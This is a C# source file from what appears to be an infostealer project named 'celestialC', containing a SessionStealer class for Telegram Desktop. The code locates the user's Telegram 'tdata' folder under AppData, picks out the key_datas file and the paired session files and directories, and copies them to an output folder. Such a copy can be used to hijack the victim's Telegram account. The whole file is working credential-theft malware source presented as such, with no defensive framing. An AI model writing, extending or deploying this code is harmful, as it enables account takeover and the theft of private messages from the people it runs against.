﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer.Messenger.Telegram
{
    internal static class SessionStealer
    {
        internal static async Task<int> StealSessions(string dst)
        {
            int count = 0;
            var loginPaths = new List<string>();
            string[] files;
            string[] dirs;
            var has_key_datas = false;

            var telegramPath = Path.Combine(Environment.GetEnvironmentVariable("appdata"), "Telegram Desktop");

            if (Directory.Exists(telegramPath))
            {
                var tDataPath = Path.Combine(telegramPath, "tdata");
                if (Directory.Exists(tDataPath))
                {
                    files = Directory.GetFiles(tDataPath);
                    dirs = Directory.GetDirectories(tDataPath);

                    var keyDatasPath = Path.Combine(tDataPath, "key_datas");
                    if (files.Contains(keyDatasPath))
                    {
                        has_key_datas = true;
                        loginPaths.Add(keyDatasPath);
                    }

                    foreach (var file in files)
                    {
                        foreach (var dir in dirs)
                        {
                            if (Path.GetFileName(file) == Path.GetFileName(dir) + "s")
                            {
                                loginPaths.AddRange(new[] { file, dir });
                            }
                        }
                    }
                }
            }

            if (has_key_datas && loginPaths.Count - 1 > 0)
            {
                DirectoryInfo outDir = null;
                try
                {
                    Directory.CreateDirectory(dst);
                    dst += "\\tdata";
                    outDir = Directory.CreateDirectory(dst);
                    foreach (var item in loginPaths)
                    {
                        if (File.Exists(item))
                        {
                            File.Copy(item, Path.Combine(dst, Path.GetFileName(item)));
                        }
                        else if (Directory.Exists(item))
                        {
                            Directory.CreateDirectory(Path.Combine(dst, Path.GetFileName(item)));
                            foreach (var file in Directory.GetFiles(item))
                            {
                                File.Copy(file, Path.Combine(Path.Combine(dst, Path.GetFileName(item)), Path.GetFileName(file)));
                            }
                            foreach (var dir in Directory.GetDirectories(item))
                            {
                                foreach (var file in Directory.GetFiles(dir))
                                {
                                    File.Copy(file, Path.Combine(Path.Combine(dst, Path.GetFileName(dir)), Path.GetFileName(file)));
                                }
                            }
                        }

                    }
                    count = (loginPaths.Count - 1) / 2;
                }
                catch (Exception ex)
                {
                    try
                    {
                        outDir?.Delete(true);
                    }
                    catch { }

                    Console.WriteLine(ex);
                }
            }
            return count;
        }
    }
}